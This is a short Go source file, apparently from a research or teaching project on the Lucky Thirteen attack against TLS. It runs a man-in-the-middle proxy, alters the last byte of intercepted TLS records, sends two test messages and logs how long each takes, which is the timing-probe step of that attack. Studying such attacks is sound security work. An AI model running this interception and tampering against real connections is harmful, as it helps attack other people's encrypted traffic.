/** Lucky 13 Client **/
package main

import (
	"github.com/jakemask/lucky13/defaults"
	"github.com/jakemask/lucky13/proxy"
	"github.com/jakemask/lucky13/tlsparse"
	"log"
)

func simpleMITM(record *tlsparse.Record) *tlsparse.Record {
	record.Message[len(record.Message)-1] += 1
	return proxy.VerboseMITM(record)
}

func main() {
	prox := proxy.Serve(proxy.Config{
		ProxyPort:  defaults.PROXY_PORT,
		ServerHost: defaults.SERVER_HOST,
		ServerPort: defaults.SERVER_PORT,
	})

	duration := prox.Send([]byte("12345678901234567890"), simpleMITM)
	log.Printf("took: %v", duration)

	duration = prox.Send([]byte("1234567890123456789012345678901234567890"), simpleMITM)
	log.Printf("took: %v", duration)
}
